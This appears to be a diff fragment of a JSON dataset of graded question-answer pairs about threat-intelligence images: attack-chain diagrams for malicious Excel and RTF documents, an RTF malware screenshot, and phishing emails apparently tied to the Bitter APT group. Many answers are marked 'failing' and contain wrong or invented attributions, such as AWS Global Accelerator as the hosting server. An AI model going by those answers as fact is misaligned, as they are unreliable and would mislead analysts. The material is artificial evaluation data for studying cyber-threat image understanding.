+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are to illustrate the stages of a malicious Excel infection chain in cybersecurity presentations or reports.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve spear phishing emails, malicious Excel documents, and the use of schtasks for scheduled tasks to download payloads from a hosting server.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the sequential relationship of the processes in the image?",
+                    "answer": "The sequential relationship of the processes is spear phishing email, Excel document, EQNEDT32, schtasks, hosting server, payload, and C2.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible targets of attack in the image?",
+                    "answer": "The possible targets of attack are Excel Document and Hosting Server.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the role of 'schtasks' in the image?",
+                    "answer": "The role of 'schtasks' is to schedule tasks.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What is the significance of 'EQNEDT32' in the context of the image?",
+                    "answer": "The significance of 'EQNEDT32' is it represents a malicious component triggered by the Excel document.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What actions are performed on the hosting server in the image?",
+                    "answer": "The actions performed on the hosting server are downloading the payload.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the function of the C2 server depicted in the image?",
+                    "answer": "The function of the C2 server depicted in the image is to receive the payload.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What organizations or entities could potentially be at risk according to the processes shown in the image?",
+                    "answer": "Organizations using Excel and schtasks could potentially be at risk according to the processes shown in the image.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What types of precautions can be taken to prevent the attack sequence shown in the image?",
+                    "answer": "The types of precautions are implementing robust email filtering, educating users on identifying spear phishing emails, and restricting the execution of unauthorized schtasks.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What does the iconography in the image indicate about each step in the process?",
+                    "answer": "The iconography indicates a spear phishing email leading to an Excel document, which triggers EQNEDT32 and schtasks commands to download a payload from a hosting server to the C2.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What vulnerabilities are specifically exploited according to the image?",
+                    "answer": "The vulnerabilities exploited are specifically within the Excel Document and EQNEDT32.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the role of AWS Global Accelerator in the context of the image?",
+                    "answer": "The role of AWS Global Accelerator is not mentioned in the context of the image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How is network proxying depicted in the image?",
+                    "answer": "Network proxying is depicted as a process where the Excel Document uses EQNEDT32 and schtasks to communicate with the Hosting Server and retrieve the Payload.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What themed lure documents are involved in the process illustrated by the image?",
+                    "answer": "The themed lure document involved in the process illustrated by the image is an Excel Document.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "Where does the image indicate initial access is gained from?",
+                    "answer": "The initial access is gained from a Spear Phishing Email.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the indicators of persistent access in the image?",
+                    "answer": "The indicators of persistent access are the use of \"schtasks\" to schedule tasks.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What entities are the primary focus of the infiltration strategy in the image?",
+                    "answer": "The primary focus of the infiltration strategy in the image is the Excel Document and the Hosting Server.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                }
+            ]
+        },
+        {
+            "name": "Malicious Excel spreadsheet.PNG",
+            "pic_type": "Application Tool Screenshot",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is an Excel spreadsheet with a formula using the EMBED function in cell A1.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is Microsoft Excel.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses are for demonstrating spreadsheet formatting or object embedding in a document.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve embedding malicious equations in a spreadsheet.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of the selected cell range in the image?",
+                    "answer": "The significance of the selected cell range is to highlight the area affected by the embedded equation.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What type of formula or function is used in the formula bar of the image?",
+                    "answer": "The type of formula used in the formula bar is an EMBED function.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the visible tabs and options in the menu of the image?",
+                    "answer": "The visible tabs in the menu are File, Home, Insert, Page Layout, Formulas, Data, Review, View, Format, Tell me, Sign in, and Share.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the potential security risks depicted in the image?",
+                    "answer": "The potential security risks depicted in the image include the use of an embedded object that could execute malicious code.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What might the embedded object in the image represent?",
+                    "answer": "The embedded object might represent a mathematical equation.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible relationships between the different elements in the image?",
+                    "answer": "The possible relationships are between the Excel spreadsheet elements, formula usage, and data visualization through the embedded object.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure is not depicted in this image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What specific vulnerabilities are likely being exploited as indicated by the image?",
+                    "answer": "The specific vulnerabilities likely being exploited are related to Equation Editor.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "How is the AWS Global Accelerator potentially used in the context of the activities shown in the image?",
+                    "answer": "The AWS Global Accelerator is potentially used for optimizing and accelerating the delivery of applications shown in the image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "In what way could network proxying (T1090-Proxy) be illustrated in the image?",
+                    "answer": "The network proxying could be illustrated by the connections between cells A, B, and C.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the image depict the technique of masquerading as legitimate software, such as a Windows security update service?",
+                    "answer": "The image depicts the technique by showing a formula that embeds an object, which could be malicious code masquerading as a legitimate Windows security update service.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "Where can indicators of the C2 server infrastructure be inferred from the image?",
+                    "answer": "Indicators of the C2 server infrastructure can be inferred from the formula bar and cell content in the image.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What aspect of governmental targeting is reflected in the image based on its content?",
+                    "answer": "The aspect of governmental targeting reflected in the image is the use of spreadsheet software for data analysis.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Malicious RTF document sample.PNG",
+            "pic_type": "Malware Code",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a Microsoft Word interface with a document containing a single square shape and a segment of hexadecimal code.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a Microsoft Word document.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses are for document editing and viewing binary code.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve code injection and obfuscation.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the possible function of the zCode in the image?",
+                    "answer": "The possible function of the zCode is to obfuscate data.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure in the context of this image is not specified.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of the hexadecimal sequence highlighted in the image?",
+                    "answer": "The significance of the hexadecimal sequence highlighted in the image is it represents a specific file signature or identifier.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the structure and syntax of the code present in the image?",
+                    "answer": "The structure and syntax of the code present in the image is a series of hexadecimal values and escape sequences.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the possible reason for the presence of a blank square in the image?",
+                    "answer": "The possible reason for the presence of a blank square is placeholder content.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What types of data or information are encoded within the script shown in the image?",
+                    "answer": "The types of data encoded within the script shown in the image are hexadecimal and Base64 encoded strings.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What software or applications could be associated with the elements displayed in the image?",
+                    "answer": "The software associated with the elements displayed in the image is Microsoft Word.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "Where is the location of the object data in the image?",
+                    "answer": "The location of the object data is at the bottom of the image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the font size and style specified in the toolbar in the image?",
+                    "answer": "The font size and style specified in the toolbar in the image are 12 and Times New Roman.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible vulnerabilities exposed by the elements in the image?",
+                    "answer": "The possible vulnerabilities exposed include potential code injection and execution through the embedded object data.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the potential security risks inherent in the content of the image?",
+                    "answer": "The potential security risks inherent in the content of the image include code injection and execution vulnerabilities due to the presence of embedded object data.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the potential significance of AWS Global Accelerator depicted in the image?",
+                    "answer": "The potential significance of AWS Global Accelerator depicted in the image is to indicate a service used for improving the performance and availability of applications.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What type of encoded command might be shown in the lower section of the image?",
+                    "answer": "The type of encoded command might be a Base64 encoded payload.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What vulnerabilities (CVE-2017-11882, CVE-2018-0798, CVE-2018-0802) are depicted or referenced in this image?",
+                    "answer": "The vulnerabilities depicted or referenced in this image are CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What evidence of network proxying techniques can be derived from the image?",
+                    "answer": "The evidence of network proxying techniques is the presence of encoded data strings at the bottom of the image.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Malicious RTF infection chain summary.PNG",
+            "pic_type": "Attack Flow or Intelligence Structure",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is the Malicious RTF Infection Chain.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are to illustrate the stages of a malicious RTF infection chain in cybersecurity presentations or reports.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve spear phishing emails, malicious RTF documents, exploitation through EQNEDT32, and communication with a C2 server.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the sequential relationship of the processes in the image?",
+                    "answer": "The sequential relationship of the processes is Spear Phishing Email, RTF Document, EQNEDT32, Hosting Server, Payload, C2.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible targets of attack in the image?",
+                    "answer": "The possible targets of attack are the hosting server and C2.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of the 'EQNEDT32' component in the image?",
+                    "answer": "The significance of the 'EQNEDT32' component is that it represents a process in the infection chain.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the potential entry points for an attack as shown in the image?",
+                    "answer": "The potential entry points for an attack are spear phishing email and RTF document.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What role does the 'Hosting Server' play in the image?",
+                    "answer": "The 'Hosting Server' role in the image is to host the EQNEDT32 component.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the connection between the 'Spear Phishing Email' and the 'RTF Document' in the image?",
+                    "answer": "The connection between the 'Spear Phishing Email' and the 'RTF Document' is that the spear phishing email delivers the RTF document.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "How does the payload delivery process occur in the image?",
+                    "answer": "The payload delivery process occurs through a spear phishing email containing an RTF document that triggers the EQNEDT32 module to connect with a hosting server and ultimately communicate with a C2 server.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the function of the 'C2' element in the image?",
+                    "answer": "The function of the 'C2' element is to act as the command and control server for the payload.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What vulnerabilities are exploited as shown in the image?",
+                    "answer": "The vulnerabilities exploited are in the RTF document and EQNEDT32.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "How does the threat actor utilize AWS Global Accelerator in the context of the image?",
+                    "answer": "The threat actor utilizes AWS Global Accelerator as the hosting server in the infection chain.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What tactic is represented by network proxying (T1090-Proxy) in the image?",
+                    "answer": "The tactic represented by network proxying (T1090-Proxy) in the image is \"Hosting Server.\"",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What governmental entities are targeted according to the image description?",
+                    "answer": "The governmental entities targeted are not specified in the image description.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What infrastructure is leveraged by the attackers in the image for command and control?",
+                    "answer": "The infrastructure leveraged by the attackers for command and control is the C2.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                }
+            ]
+        },
+        {
+            "name": "Phishing email header information.PNG",
+            "pic_type": "Descriptive Image and Content Explanation",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is an email header.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is an email server log from mtax2-v.ntc.net.pk.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure is not mentioned in this image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for analyzing email headers to identify potential phishing attempts or unauthorized access.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve phishing and email spoofing.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the date and time indicated in the image?",
+                    "answer": "The date and time indicated in the image is Thu, 11 Nov 2021 17:03:58 +0500.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What email addresses are visible in the image?",
+                    "answer": "The visible email addresses are RAB-13 RANGEUR <cdrrab13bd@gmail.com> and arc@desto.gov.pk.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the X-Originating-IP address shown in the image?",
+                    "answer": "The X-Originating-IP address shown in the image is [202.83.161.226].",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What software version is mentioned in the image?",
+                    "answer": "The software version mentioned in the image is Zimbra 8.8.15_GA_4101.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of the 'Received' line in the image?",
+                    "answer": "The significance of the 'Received' line is it shows the email's path from the sender to the receiver.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What can be inferred from the subject of the email in the image?",
+                    "answer": "The subject of the email indicates that the content is related to CDR.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "good"
+                },
+                {
+                    "question": "What specific vulnerabilities are being exploited in the context of this image?",
+                    "answer": "The specific vulnerabilities being exploited are related to email spoofing and potentially malicious attachments.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What insights can be drawn about the AWS Global Accelerator's use in this infrastructure from the image?",
+                    "answer": "No insights about the AWS Global Accelerator's use can be drawn from this image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What types of files or documents could be associated with the email content shown in this image?",
+                    "answer": "The types of files or documents could be associated with the email content shown in this image are CDR.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the image suggest tactics for evading detection?",
+                    "answer": "The image suggests tactics for evading detection by showing an email with a potentially malicious attachment and obfuscated sender information.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What information in the image indicates a targeted focus on Bangladesh's government entities?",
+                    "answer": "The email addresses and domain names related to Bangladesh's government entities indicate a targeted focus on Bangladesh's government entities.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "How does the image relate to the use of network proxying in cyber operations?",
+                    "answer": "The image relates to the use of network proxying in cyber operations by showing an email header with multiple IP addresses and domain names, indicating possible routing through different servers.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What C2 server details can be interpreted from the image?",
+                    "answer": "The C2 server details include IP address 202.83.161.226 and the domain mata2-v.ntc.net.pk.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What observations can be made from the 'Received' lines regarding potential email relay paths?",
+                    "answer": "The potential email relay paths observed from the 'Received' lines include the emails being sent from mata2-p.ntc.net to mata2-v.ntc.net, indicating a possible internal network relay before reaching the final destination.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Phishing email sample 1.PNG",
+            "pic_type": "Descriptive Image and Content Explanation",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is an email with an attached document titled \"Registered Cases List.xlsx.\"",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for reference in cyber threat intelligence analysis.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve phishing and potentially malicious attachments.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the intended audience of the email shown in the image?",
+                    "answer": "The intended audience of the email is the recipient responsible for further necessary action regarding the registered cases.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What evidence in the image suggests phishing or fraudulent activity?",
+                    "answer": "The evidence suggesting phishing or fraudulent activity is the suspicious email attachment \"Registered Cases List.xlsx\" from an unknown sender.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the significance of the file size of the attachment in the image?",
+                    "answer": "The significance of the file size is that it is unusually small for a document containing registered cases, suggesting it may be a malicious file.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What email addresses are visible in the image, and what do they imply?",
+                    "answer": "The email addresses visible are \"chief_pia@pc.gov.pk\" and \"opsoffr_rab14@rab.gov.bd,\" implying official government communication.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What visual elements in the image suggest formality or informality?",
+                    "answer": "The visual elements suggesting formality include the structured layout, official email addresses, and the formal salutation \"Dear Sir,\" while the orange placeholder suggests informality.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "good"
+                },
+                {
+                    "question": "What specific instructions are given in the email shown in the image?",
+                    "answer": "The specific instruction given in the email is to find the attached document below for further necessary action.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure is not mentioned in the context of this image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What vulnerabilities are being exploited as indicated by the image?",
+                    "answer": "The vulnerabilities being exploited are related to email attachment security.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What indications are there in the image that suggest involvement by the Bitter APT group?",
+                    "answer": "The indications are the email address and the nature of the document attachment, which align with tactics used by the Bitter APT group.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the relevance of the RAB-13 RANGPUR identity in the context of this phishing email?",
+                    "answer": "The relevance of the RAB-13 RANGPUR identity is to impersonate an official entity to increase credibility and manipulate the recipient into opening the malicious attachment.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What kind of document is 'Registered Cases List.xlsx' likely to be, based on the image?",
+                    "answer": "The document 'Registered Cases List.xlsx' is likely to be a spreadsheet.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What details in the image align with the tactics (e.g., network proxying) described in the knowledge graph?",
+                    "answer": "The details aligning with the tactics are the use of an official-looking email address and a document attachment to potentially deliver malicious content.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Phishing email sample 2.PNG",
+            "pic_type": "Descriptive Image and Content Explanation",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is an email requesting to go through an attached file for CDR application.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for phishing or malware distribution.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
